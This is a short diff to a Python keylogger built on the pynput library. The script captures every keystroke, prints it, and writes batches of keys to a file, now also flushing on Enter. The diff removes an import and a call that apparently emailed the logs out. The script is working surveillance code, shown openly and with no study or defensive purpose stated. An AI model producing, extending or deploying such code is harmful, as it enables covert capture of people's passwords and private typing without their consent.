@@ -1,7 +1,6 @@
 #imported from required library pynput
 from pynput import keyboard
 from pynput.keyboard import Key, Listener
-import notify
 
 count = 0
 keys = []
@@ -14,7 +13,7 @@ def on_press(key):
 
     print("{0} pressed".format(key))
 
-    if count >= 50:
+    if count >= 50 or str(key) == 'Key.enter':
         count = 0
         write_file(keys)
         keys = []
@@ -31,7 +30,6 @@ def write_file(keys):
                 f.write("\n")
             elif key.find("Key"):
                 f.write(key)
-                
-notify.notify_email()
+
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
